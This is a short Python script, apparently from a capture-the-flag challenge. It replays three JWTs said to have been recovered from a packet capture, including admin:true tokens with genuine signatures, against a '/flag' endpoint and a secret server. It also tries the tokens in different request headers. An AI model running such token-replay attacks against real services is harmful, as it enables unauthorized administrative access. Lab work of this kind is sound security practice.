#!/usr/bin/env python3
import requests

MAGIC = "magic-key.hkn"

# The EXACT historical JWTs recovered verbatim from the original pcap (real signatures, not forged)
HIST_ADMIN_TRUE_OLD_TS = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidGltZXN0YW1wIjoxMzAwMDAwMDAwfQ.d-H00PqEmUozSDiQxSRWBYeyIqvuaTifVVBHlKaE2Wc"
HIST_ADMIN_TRUE_NEW_TS = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidGltZXN0YW1wIjoyMDAzNDMyNjc1fQ.UzBYpt42LunaOSfc2eHGjlpE6d5bw1TXkcNIZOj5x7k"
HIST_ADMIN_FALSE_OLD_TS = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsInRpbWVzdGFtcCI6MTMwMDAwMDAwMH0.5hQcQuBN2aj1hx5NAuVyZlzimDTEt11tfsq9EaHiKaU"

tokens = {
    "admin:true, ts=1300000000 (historical sig)": HIST_ADMIN_TRUE_OLD_TS,
    "admin:true, ts=2003432675 (historical sig)": HIST_ADMIN_TRUE_NEW_TS,
    "admin:false, ts=1300000000 (historical sig)": HIST_ADMIN_FALSE_OLD_TS,
}

SECRET = "77.20.124.51"

print("### Against secret-server /next_chars?char=s, as JWT header ###")
for label, tok in tokens.items():
    r = requests.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": tok}, timeout=5)
    print(f"  {label} -> {r.status_code}: {r.text.strip()[:150]}")

print("\n### Against magic-key.hkn, as JWT header ###")
for label, tok in tokens.items():
    for path, params in [("/flag", None), ("/next_chars", {"char": "s"})]:
        r = requests.get(f"http://{MAGIC}{path}", params=params, headers={"JWT": tok}, timeout=5)
        print(f"  {label} | {path} -> {r.status_code}: {r.text.strip()[:150]}")

print("\n### Against magic-key.hkn, as Session-Token value (plain) ###")
for label, tok in tokens.items():
    for extra_h, extra_v in [("URL", "/flag"), ("URL-Maybe", "/flag")]:
        r = requests.get(f"http://{MAGIC}/flag", headers={"Session-Token": tok, extra_h: extra_v}, timeout=5)
        print(f"  {label} | {extra_h} -> {r.status_code}: {r.text.strip()[:150]}")
